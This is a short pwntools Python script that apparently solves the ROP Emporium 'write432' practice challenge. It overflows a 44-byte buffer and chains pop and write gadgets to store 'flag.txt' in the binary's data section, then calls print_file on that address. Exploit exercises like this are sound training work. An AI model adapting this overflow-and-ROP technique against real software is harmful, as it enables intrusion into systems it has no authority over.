from pwn import *
exe = context.binary = ELF('write432', checksec=False)

pop_gadget = p32(0x080485aa)
write_gadget = p32(0x08048543)
print_file_function = p32(0x080483d0)
data_section_addr = p32(0x0804a018)

offset = 44
payload = b'\x90' * offset
payload += pop_gadget
payload += data_section_addr
payload += b'flag'
payload += write_gadget

payload += pop_gadget
payload += p32(0x0804a018 + 0x4)
payload += b'.txt'
payload += write_gadget

payload += print_file_function
payload += p32(0x0)
payload += data_section_addr

p = process()
p.clean()
p.sendline(payload)
p.interactive()